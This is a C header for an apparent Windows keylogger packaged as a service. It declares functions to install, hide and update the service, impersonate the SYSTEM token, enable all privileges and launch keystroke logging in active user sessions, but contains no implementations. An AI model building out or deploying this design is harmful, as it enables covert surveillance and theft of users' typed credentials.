#pragma once
#pragma warning(disable: 4820)
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <wtsapi32.h>

#include "consts.h"

#define REEF(x){ if (x){ free(x); x = NULL;}}

VOID InstallSvc(SC_HANDLE SCManager);
VOID StartSvc(SC_HANDLE SCManager);
VOID StopSvc(SC_HANDLE SCManager);
VOID DeleteSvc(SC_HANDLE SCManager);
VOID UpdateSvc(SC_HANDLE SCManager);
VOID HideSvc(SC_HANDLE SCManager);
VOID ShowSvc(SC_HANDLE SCManager);

VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, DWORD sessionID);
VOID PrintUserNameByProc(void);
VOID PrintUserNameByThread(void);
VOID PrintPrivileges(HANDLE hToken);
DWORD GetPIDByProcName(void);
BOOL EnableAllPrivilege(HANDLE currentToken);


VOID WINAPI SvcMain(DWORD ac, LPTSTR *av);
VOID SvcInit(DWORD ac, LPTSTR *av);
VOID WINAPI SvcCtrlHandler(DWORD ctrl);
VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint);

DWORD GetActiveSessionId(void);
DWORD ChooseSessionToLog(void);

VOID log(void *toLog);
int PrintError(void);